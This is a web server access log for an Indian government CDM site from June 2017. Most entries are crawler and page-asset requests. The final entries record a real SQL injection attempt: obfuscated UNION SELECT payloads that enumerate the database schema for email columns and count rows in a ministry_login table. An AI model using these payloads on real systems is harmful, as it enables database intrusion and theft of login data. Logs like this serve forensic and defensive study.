66.102.6.111 - - [23/Jun/2017:05:34:10 +0530] "GET /images/bulllet2.gif HTTP/1.1" 200 58 "http://www.cdmindia.gov.in/project_details_view.php?id=889" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19"
66.102.6.115 - - [23/Jun/2017:05:34:10 +0530] "GET /images/gtz.jpg HTTP/1.1" 200 15484 "http://www.cdmindia.gov.in/project_details_view.php?id=889" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19"
66.102.6.113 - - [23/Jun/2017:05:34:10 +0530] "GET /images/spacer.gif HTTP/1.1" 200 43 "http://www.cdmindia.gov.in/project_details_view.php?id=889" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19"
66.102.6.111 - - [23/Jun/2017:05:34:10 +0530] "GET /images/bullet1.gif HTTP/1.1" 200 67 "http://www.cdmindia.gov.in/project_details_view.php?id=889" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19"
66.102.6.115 - - [23/Jun/2017:05:34:10 +0530] "GET /images/bullet4.gif HTTP/1.1" 200 67 "http://www.cdmindia.gov.in/project_details_view.php?id=889" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19"
66.102.6.115 - - [23/Jun/2017:05:34:10 +0530] "GET /includes/ncdma.css HTTP/1.1" 200 13023 "http://www.cdmindia.gov.in/project_details_view.php?id=889" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19"
66.102.6.113 - - [23/Jun/2017:05:34:10 +0530] "GET /images/img3.jpg HTTP/1.1" 200 26957 "http://www.cdmindia.gov.in/project_details_view.php?id=889" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19"
66.102.6.111 - - [23/Jun/2017:05:34:10 +0530] "GET /images/img3.jpg HTTP/1.1" 200 26957 "http://www.cdmindia.gov.in/project_details_view.php?id=889" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19"
66.102.6.115 - - [23/Jun/2017:05:34:10 +0530] "GET /images/fdm.jpg HTTP/1.1" 200 2043 "http://www.cdmindia.gov.in/project_details_view.php?id=889" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19"
66.102.6.113 - - [23/Jun/2017:05:34:10 +0530] "GET /Scripts/AC_RunActiveContent.js HTTP/1.1" 200 8321 "http://www.cdmindia.gov.in/project_details_view.php?id=889" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19"
66.102.6.111 - - [23/Jun/2017:05:34:10 +0530] "GET /images/img2.jpg HTTP/1.1" 200 16276 "http://www.cdmindia.gov.in/project_details_view.php?id=889" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19"
66.102.6.115 - - [23/Jun/2017:05:34:10 +0530] "GET /ncdma.css HTTP/1.1" 200 12640 "http://www.cdmindia.gov.in/project_details_view.php?id=889" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19"
66.102.6.113 - - [23/Jun/2017:05:34:11 +0530] "GET /images/img1.jpg HTTP/1.1" 200 1251 "http://www.cdmindia.gov.in/project_details_view.php?id=889" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19"
66.102.6.113 - - [23/Jun/2017:05:34:11 +0530] "GET /images/fbg.jpg HTTP/1.1" 200 325 "http://www.cdmindia.gov.in/project_details_view.php?id=889" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19"
40.77.167.35 - - [23/Jun/2017:05:34:22 +0530] "GET /project_details_view.php?id=1214 HTTP/1.1" 200 14463 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
199.30.25.226 - - [23/Jun/2017:05:37:53 +0530] "GET /js/index_validations.js HTTP/1.1" 200 3143 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 BingPreview/1.0b"
157.55.39.81 - - [23/Jun/2017:05:39:30 +0530] "GET /downloads/Comparision%20of%20PCN_30.03.doc HTTP/1.1" 200 49664 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
146.148.64.128 - - [23/Jun/2017:05:39:47 +0530] "GET /robots.txt HTTP/1.1" 404 208 "-" "ltx71 - (http://ltx71.com/)"
66.249.79.15 - - [23/Jun/2017:05:39:58 +0530] "GET /project_details_view_report.php?id=1480 HTTP/1.1" 200 13183 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.69.83 - - [23/Jun/2017:05:41:37 +0530] "GET /project_details_view_report.php?id=1131 HTTP/1.1" 200 13147 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
35.184.189.105 - - [23/Jun/2017:05:44:55 +0530] "GET /robots.txt HTTP/1.1" 404 208 "-" "ltx71 - (http://ltx71.com/)"
66.249.79.19 - - [23/Jun/2017:05:45:08 +0530] "GET /project_details_view.php?id=522 HTTP/1.1" 200 14006 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
202.46.54.11 - - [23/Jun/2017:05:45:54 +0530] "GET /project_details_view_report.php?id=1073 HTTP/1.1" 200 13373 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36"
146.148.64.128 - - [23/Jun/2017:05:50:03 +0530] "GET /robots.txt HTTP/1.1" 404 208 "-" "ltx71 - (http://ltx71.com/)"
66.249.79.15 - - [23/Jun/2017:05:50:18 +0530] "GET /project_details_view.php?id=1334&oid=&page=39&reporttype= HTTP/1.1" 200 14414 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
146.148.64.128 - - [23/Jun/2017:05:54:31 +0530] "GET /robots.txt HTTP/1.1" 404 208 "-" "ltx71 - (http://ltx71.com/)"
146.148.64.128 - - [23/Jun/2017:05:54:52 +0530] "GET /detail_news.php?id=4 HTTP/1.1" 302 19562 "-" "ltx71 - (http://ltx71.com/)"
207.46.13.27 - - [23/Jun/2017:05:54:56 +0530] "GET /imp_links.php HTTP/1.1" 200 17834 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
40.77.167.35 - - [23/Jun/2017:05:55:13 +0530] "GET /images/h_il.jpg HTTP/1.1" 200 22106 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
66.249.79.15 - - [23/Jun/2017:05:55:27 +0530] "GET /reports_list_details.php?id=Punjab&reporttype=2&page=1 HTTP/1.1" 200 21606 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
146.148.64.128 - - [23/Jun/2017:05:55:56 +0530] "GET /detail_news.php?id=3 HTTP/1.1" 302 18397 "-" "ltx71 - (http://ltx71.com/)"
207.46.13.27 - - [23/Jun/2017:05:56:27 +0530] "GET /project_details_view_report.php?id=1135 HTTP/1.1" 200 13173 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
146.148.64.128 - - [23/Jun/2017:05:57:54 +0530] "GET /future_projects.php HTTP/1.1" 302 26210 "-" "ltx71 - (http://ltx71.com/)"
207.46.13.27 - - [23/Jun/2017:05:58:08 +0530] "GET /Approved_proj_reports_list_details.php?id=13&reporttype=1&scale=&sdt=&edt=&exec= HTTP/1.1" 200 15917 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
207.46.13.27 - - [23/Jun/2017:05:58:09 +0530] "GET /capacity_building.php/ HTTP/1.1" 200 19186 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
207.46.13.27 - - [23/Jun/2017:05:58:09 +0530] "GET /index.php?erro=1 HTTP/1.1" 200 19507 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
146.148.64.128 - - [23/Jun/2017:05:58:35 +0530] "GET /downloads/Carbon%20Market%20Roadmap.pdf HTTP/1.1" 200 4344697 "-" "ltx71 - (http://ltx71.com/)"
157.55.39.174 - - [23/Jun/2017:05:59:03 +0530] "GET /Approved_proj_reports_list_details.php?id=1&reporttype=1&scale=&sdt=&edt=&exec= HTTP/1.1" 200 16308 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.174 - - [23/Jun/2017:05:59:06 +0530] "GET /approved_projects.php?n=1/ HTTP/1.1" 200 16642 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
146.148.64.128 - - [23/Jun/2017:05:59:20 +0530] "GET /constitution.php HTTP/1.1" 200 23669 "-" "ltx71 - (http://ltx71.com/)"
66.249.79.17 - - [23/Jun/2017:06:00:18 +0530] "GET /project_details_view.php?id=1548 HTTP/1.1" 200 16095 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
157.55.39.174 - - [23/Jun/2017:06:00:29 +0530] "GET /registration.php HTTP/1.1" 302 28529 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.174 - - [23/Jun/2017:06:00:29 +0530] "GET /logout.php HTTP/1.1" 302 369 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.174 - - [23/Jun/2017:06:00:30 +0530] "GET /index.php HTTP/1.1" 200 19480 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
123.125.71.49 - - [23/Jun/2017:06:04:12 +0530] "GET / HTTP/1.1" 200 19480 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
40.77.167.35 - - [23/Jun/2017:06:04:55 +0530] "GET /project_details_view.php?id=1486 HTTP/1.1" 200 14706 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
66.249.79.15 - - [23/Jun/2017:06:05:17 +0530] "GET /reports_list_details.php?id=4&reporttype=1&page=2 HTTP/1.1" 200 21559 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
202.46.56.95 - - [23/Jun/2017:06:07:21 +0530] "GET /project_details_view_report.php?id=1418 HTTP/1.1" 200 13182 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36"
146.148.64.128 - - [23/Jun/2017:06:07:28 +0530] "GET /robots.txt HTTP/1.1" 404 208 "-" "ltx71 - (http://ltx71.com/)"
146.148.64.128 - - [23/Jun/2017:06:07:56 +0530] "GET /js/md5.js HTTP/1.1" 200 13194 "-" "ltx71 - (http://ltx71.com/)"
66.249.79.15 - - [23/Jun/2017:06:10:18 +0530] "GET /reports_list_details.php?id=1&reporttype=1&page=73 HTTP/1.1" 200 22457 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
54.173.165.103 - - [23/Jun/2017:06:10:55 +0530] "GET / HTTP/1.1" 200 19480 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36 http://notifyninja.com/monitoring"
216.244.66.248 - - [23/Jun/2017:06:15:16 +0530] "GET /capacity_building.php HTTP/1.1" 200 19186 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
66.249.79.15 - - [23/Jun/2017:06:15:18 +0530] "GET /project_details_view.php?id=774 HTTP/1.1" 200 15032 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
35.184.189.105 - - [23/Jun/2017:06:16:14 +0530] "GET /robots.txt HTTP/1.1" 404 208 "-" "ltx71 - (http://ltx71.com/)"
35.184.189.105 - - [23/Jun/2017:06:17:57 +0530] "GET /detail_news.php?id=18 HTTP/1.1" 302 18713 "-" "ltx71 - (http://ltx71.com/)"
146.148.64.128 - - [23/Jun/2017:06:19:14 +0530] "GET /robots.txt HTTP/1.1" 404 208 "-" "ltx71 - (http://ltx71.com/)"
146.148.64.128 - - [23/Jun/2017:06:19:26 +0530] "GET /events_more.php HTTP/1.1" 200 16905 "-" "ltx71 - (http://ltx71.com/)"
66.249.79.95 - - [23/Jun/2017:06:20:18 +0530] "GET / HTTP/1.1" 200 19480 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
146.148.64.128 - - [23/Jun/2017:06:20:28 +0530] "GET /downloads/Template_sharing%202Percent.doc HTTP/1.1" 200 73728 "-" "ltx71 - (http://ltx71.com/)"
27.38.242.207 - - [23/Jun/2017:06:22:46 +0530] "GET /robots.txt HTTP/1.0" 404 208 "-" "GigablastOpenSource/1.0"
27.38.242.207 - - [23/Jun/2017:06:22:49 +0530] "GET / HTTP/1.0" 200 19480 "-" "GigablastOpenSource/1.0"
202.46.51.82 - - [23/Jun/2017:06:27:12 +0530] "GET /project_details_view_report.php?id=405 HTTP/1.1" 200 13167 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36"
40.77.178.225 - - [23/Jun/2017:06:27:54 +0530] "GET /Scripts/AC_RunActiveContent.js HTTP/1.1" 200 8321 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 BingPreview/1.0b"
131.253.25.186 - - [23/Jun/2017:06:28:03 +0530] "GET /Scripts/AC_RunActiveContent.js HTTP/1.1" 200 8321 "http://www.cdmindia.gov.in/contactus.php" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 BingPreview/1.0b"
66.249.79.15 - - [23/Jun/2017:06:30:38 +0530] "GET /reports_list_details.php?id=tubkayrstf&reporttype=&page=130 HTTP/1.1" 200 21924 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.19 - - [23/Jun/2017:06:31:30 +0530] "GET /reports_list_details.php?id=tubkayrstf&reporttype=&page=1 HTTP/1.1" 200 21331 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
40.77.167.35 - - [23/Jun/2017:06:31:33 +0530] "GET /images/NCDMA%20PCN%20Format%2017072009.doc HTTP/1.1" 200 114176 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
35.184.189.105 - - [23/Jun/2017:06:31:39 +0530] "GET /robots.txt HTTP/1.1" 404 208 "-" "ltx71 - (http://ltx71.com/)"
66.249.79.19 - - [23/Jun/2017:06:35:38 +0530] "GET /project_details_view_report.php?id=1371 HTTP/1.1" 200 13155 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
86.192.132.63 - - [23/Jun/2017:06:35:40 +0530] "GET /detail_news.php?id=999999.9'+%2f**%2fuNiOn%2f**%2faLl+%2f**%2fsElEcT+1,2,%2f**%2fcOnCaT(0x217e21,%2f**%2fvErSiOn(),0x217e21),4,5+and+'0'='0 HTTP/1.1" 200 18132 "http://www.cdmindia.gov.in/detail_news.php?id=999999.9'+%2f**%2fuNiOn%2f**%2faLl+%2f**%2fsElEcT+1,2,%2f**%2fcOnCaT(0x217e21,%2f**%2fvErSiOn(),0x217e21),4,5+and+'0'='0" "Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-PT; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 (.NET CLR 3.5.30729)"
86.192.132.63 - - [23/Jun/2017:06:35:41 +0530] "GET /detail_news.php?id=999999.9'+%2f**%2fuNiOn%2f**%2faLl+%2f**%2fsElEcT+1,2,%2f**%2fcOnCaT(0x217e21,%2f**%2fvErSiOn(),0x217e21),4,5+and+'0'='0 HTTP/1.1" 200 18132 "http://www.cdmindia.gov.in/detail_news.php?id=999999.9'+%2f**%2fuNiOn%2f**%2faLl+%2f**%2fsElEcT+1,2,%2f**%2fcOnCaT(0x217e21,%2f**%2fvErSiOn(),0x217e21),4,5+and+'0'='0" "Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-PT; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 (.NET CLR 3.5.30729)"
86.192.132.63 - - [23/Jun/2017:06:35:42 +0530] "GET /detail_news.php?id=999999.9'+%2f**%2fuNiOn%2f**%2faLl+%2f**%2fsElEcT+1,2,(%2f**%2fsElEcT+%2f**%2fcOnCaT(0x217e21,count(t.%2f**%2ftAbLe_nAmE),0x217e21)+%2f**%2ffRoM+information_schema.%2f**%2fsChEmAtA+as+d+join+information_schema.%2f**%2ftAbLeS+as+t+on+t.%2f**%2ftAbLe_sChEmA+=+d.%2f**%2fsChEmA_NaMe+join+information_schema.%2f**%2fcOlUmNs+as+c+on+c.%2f**%2ftAbLe_sChEmA+=+d.%2f**%2fsChEmA_NaMe+and+c.%2f**%2ftAbLe_nAmE+=+t.%2f**%2ftAbLe_nAmE+%2f**%2fwHeRe+not+c.%2f**%2ftAbLe_sChEmA+in(0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c)+and+d.%2f**%2fsChEmA_NaMe+=+%2f**%2fdAtAbAsE()+and+c.%2f**%2fcOlUmN_NaMe+like+0x25656d61696c25),4,5+and+'0'='0 HTTP/1.1" 200 18127 "http://www.cdmindia.gov.in/detail_news.php?id=999999.9'+%2f**%2fuNiOn%2f**%2faLl+%2f**%2fsElEcT+1,2,(%2f**%2fsElEcT+%2f**%2fcOnCaT(0x217e21,count(t.%2f**%2ftAbLe_nAmE),0x217e21)+%2f**%2ffRoM+information_schema.%2f**%2fsChEmAtA+as+d+join+information_schema.%2f**%2ftAbLeS+as+t+on+t.%2f**%2ftAbLe_sChEmA+=+d.%2f**%2fsChEmA_NaMe+join+information_schema.%2f**%2fcOlUmNs+as+c+on+c.%2f**%2ftAbLe_sChEmA+=+d.%2f**%2fsChEmA_NaMe+and+c.%2f**%2ftAbLe_nAmE+=+t.%2f**%2ftAbLe_nAmE+%2f**%2fwHeRe+not+c.%2f**%2ftAbLe_sChEmA+in(0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c)+and+d.%2f**%2fsChEmA_NaMe+=+%2f**%2fdAtAbAsE()+and+c.%2f**%2fcOlUmN_NaMe+like+0x25656d61696c25),4,5+and+'0'='0" "Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-PT; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 (.NET CLR 3.5.30729)"
86.192.132.63 - - [23/Jun/2017:06:35:43 +0530] "GET /detail_news.php?id=999999.9'+%2f**%2fuNiOn%2f**%2faLl+%2f**%2fsElEcT+1,2,(%2f**%2fsElEcT+%2f**%2fcOnCaT(0x217e21,d.%2f**%2fsChEmA_NaMe,0x332150,t.%2f**%2ftAbLe_nAmE,0x217e21)+%2f**%2ffRoM+information_schema.%2f**%2fsChEmAtA+as+d+join+information_schema.%2f**%2ftAbLeS+as+t+on+t.%2f**%2ftAbLe_sChEmA+=+d.%2f**%2fsChEmA_NaMe+join+information_schema.%2f**%2fcOlUmNs+as+c+on+c.%2f**%2ftAbLe_sChEmA+=+d.%2f**%2fsChEmA_NaMe+and+c.%2f**%2ftAbLe_nAmE+=+t.%2f**%2ftAbLe_nAmE+%2f**%2fwHeRe+not+c.%2f**%2ftAbLe_sChEmA+in(0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c)+and+d.%2f**%2fsChEmA_NaMe+=+%2f**%2fdAtAbAsE()+and+c.%2f**%2fcOlUmN_NaMe+like+0x25656d61696c25+%2f**%2fgRoUp%2f**%2fbY+t.%2f**%2ftAbLe_nAmE+%2f**%2flImIt+0,1),4,5+and+'0'='0 HTTP/1.1" 200 18151 "http://www.cdmindia.gov.in/detail_news.php?id=999999.9'+%2f**%2fuNiOn%2f**%2faLl+%2f**%2fsElEcT+1,2,(%2f**%2fsElEcT+%2f**%2fcOnCaT(0x217e21,d.%2f**%2fsChEmA_NaMe,0x332150,t.%2f**%2ftAbLe_nAmE,0x217e21)+%2f**%2ffRoM+information_schema.%2f**%2fsChEmAtA+as+d+join+information_schema.%2f**%2ftAbLeS+as+t+on+t.%2f**%2ftAbLe_sChEmA+=+d.%2f**%2fsChEmA_NaMe+join+information_schema.%2f**%2fcOlUmNs+as+c+on+c.%2f**%2ftAbLe_sChEmA+=+d.%2f**%2fsChEmA_NaMe+and+c.%2f**%2ftAbLe_nAmE+=+t.%2f**%2ftAbLe_nAmE+%2f**%2fwHeRe+not+c.%2f**%2ftAbLe_sChEmA+in(0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c)+and+d.%2f**%2fsChEmA_NaMe+=+%2f**%2fdAtAbAsE()+and+c.%2f**%2fcOlUmN_NaMe+like+0x25656d61696c25+%2f**%2fgRoUp%2f**%2fbY+t.%2f**%2ftAbLe_nAmE+%2f**%2flImIt+0,1),4,5+and+'0'='0" "Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-PT; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 (.NET CLR 3.5.30729)"
86.192.132.63 - - [23/Jun/2017:06:35:45 +0530] "GET /detail_news.php?id=999999.9'+%2f**%2fuNiOn%2f**%2faLl+%2f**%2fsElEcT+1,2,(%2f**%2fsElEcT+%2f**%2fcOnCaT(0x217e21,count(*),0x217e21)+%2f**%2ffRoM+cdmindia.ministry_login),4,5+and+'0'='0 HTTP/1.1" 200 18128 "http://www.cdmindia.gov.in/detail_news.php?id=999999.9'+%2f**%2fuNiOn%2f**%2faLl+%2f**%2fsElEcT+1,2,(%2f**%2fsElEcT+%2f**%2fcOnCaT(0x217e21,count(*),0x217e21)+%2f**%2ffRoM+cdmindia.ministry_login),4,5+and+'0'='0" "Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-PT; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 (.NET CLR 3.5.30729)"
86.192.132.63 - - [23/Jun/2017:06:35:46 +0530] "GET /detail_news.php?id=999999.9'+%2f**%2fuNiOn%2f**%2faLl+%2f**%2fsElEcT+1,2,(%2f**%2fsElEcT+%2f**%2fcOnCaT(0x217e21,d.%2f**%2fsChEmA_NaMe,0x332150,t.%2f**%2ftAbLe_nAmE,0x217e21)+%2f**%2ffRoM+information_schema.%2f**%2fsChEmAtA+as+d+join+information_schema.%2f**%2ftAbLeS+as+t+on+t.%2f**%2ftAbLe_sChEmA+=+d.%2f**%2fsChEmA_NaMe+join+information_schema.%2f**%2fcOlUmNs+as+c+on+c.%2f**%2ftAbLe_sChEmA+=+d.%2f**%2fsChEmA_NaMe+and+c.%2f**%2ftAbLe_nAmE+=+t.%2f**%2ftAbLe_nAmE+%2f**%2fwHeRe+not+c.%2f**%2ftAbLe_sChEmA+in(0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c)+and+d.%2f**%2fsChEmA_NaMe+=+%2f**%2fdAtAbAsE()+and+c.%2f**%2fcOlUmN_NaMe+like+0x25656d61696c25+%2f**%2fgRoUp%2f**%2fbY+t.%2f**%2ftAbLe_nAmE+%2f**%2flImIt+1,1),4,5+and+'0'='0 HTTP/1.1" 200 18161 "http://www.cdmindia.gov.in/detail_news.php?id=999999.9'+%2f**%2fuNiOn%2f**%2faLl+%2f**%2fsElEcT+1,2,(%2f**%2fsElEcT+%2f**%2fcOnCaT(0x217e21,d.%2f**%2fsChEmA_NaMe,0x332150,t.%2f**%2ftAbLe_nAmE,0x217e21)+%2f**%2ffRoM+information_schema.%2f**%2fsChEmAtA+as+d+join+information_schema.%2f**%2ftAbLeS+as+t+on+t.%2f**%2ftAbLe_sChEmA+=+d.%2f**%2fsChEmA_NaMe+join+information_schema.%2f**%2fcOlUmNs+as+c+on+c.%2f**%2ftAbLe_sChEmA+=+d.%2f**%2fsChEmA_NaMe+and+c.%2f**%2ftAbLe_nAmE+=+t.%2f**%2ftAbLe_nAmE+%2f**%2fwHeRe+not+c.%2f**%2ftAbLe_sChEmA+in(0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c)+and+d.%2f**%2fsChEmA_NaMe+=+%2f**%2fdAtAbAsE()+and+c.%2f**%2fcOlUmN_NaMe+like+0x25656d61696c25+%2f**%2fgRoUp%2f**%2fbY+t.%2f**%2ftAbLe_nAmE+%2f**%2flImIt+1,1),4,5+and+'0'='0" "Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-PT; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 (.NET CLR 3.5.30729)"
86.192.132.63 - - [23/Jun/2017:06:35:47 +0530] "GET /detail_news.php?id=999999.9'+%2f**%2fuNiOn%2f**%2faLl+%2f**%2fsElEcT+1,2,(%2f**%2fsElEcT+%2f**%2fcOnCaT(0x217e21,count(*),0x217e21)+%2f**%2ffRoM+cdmindia.moe_communicate_comments),4,5+and+'0'='0 HTTP/1.1" 200 18129 "http://www.cdmindia.gov.in/detail_news.php?id=999999.9'+%2f**%2fuNiOn%2f**%2faLl+%2f**%2fsElEcT+1,2,(%2f**%2fsElEcT+%2f**%2fcOnCaT(0x217e21,count(*),0x217e21)+%2f**%2ffRoM+cdmindia.moe_communicate_comments),4,5+and+'0'='0" "Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-PT; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 (.NET CLR 3.5.30729)"
86.192.132.63 - - [23/Jun/2017:06:35:48 +0530] "GET /detail_news.php?id=999999.9'+%2f**%2fuNiOn%2f**%2faLl+%2f**%2fsElEcT+1,2,(%2f**%2fsElEcT+%2f**%2fcOnCaT(0x217e21,d.%2f**%2fsChEmA_NaMe,0x332150,t.%2f**%2ftAbLe_nAmE,0x217e21)+%2f**%2ffRoM+information_schema.%2f**%2fsChEmAtA+as+d+join+information_schema.%2f**%2ftAbLeS+as+t+on+t.%2f**%2ftAbLe_sChEmA+=+d.%2f**%2fsChEmA_NaMe+join+information_schema.%2f**%2fcOlUmNs+as+c+on+c.%2f**%2ftAbLe_sChEmA+=+d.%2f**%2fsChEmA_NaMe+and+c.%2f**%2ftAbLe_nAmE+=+t.%2f**%2ftAbLe_nAmE+%2f**%2fwHeRe+not+c.%2f**%2ftAbLe_sChEmA+in(0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c)+and+d.%2f**%2fsChEmA_NaMe+=+%2f**%2fdAtAbAsE()+and+c.%2f**%2fcOlUmN_NaMe+like+0x25656d61696c25+%2f**%2fgRoUp%2f**%2fbY+t.%2f**%2ftAbLe_nAmE+%2f**%2flImIt+2,1),4,5+and+'0'='0 HTTP/1.1" 200 18161 